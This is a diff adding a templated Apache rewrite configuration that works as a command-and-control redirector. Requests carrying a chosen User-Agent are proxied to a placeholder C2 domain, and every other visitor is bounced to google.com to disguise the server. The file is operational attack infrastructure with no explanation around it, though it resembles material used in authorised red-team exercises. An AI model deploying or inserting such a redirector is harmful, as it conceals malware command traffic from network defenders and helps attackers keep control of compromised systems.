@@ -1,0 +1,4 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} "{{ c2_user_agent }}" [NC]
+RewriteRule ^.*$ "https://{{ c2_domain }}:443%{REQUEST_URI}" [P]
+RewriteRule ^.*$ "https://www.google.com" [L,R=302]
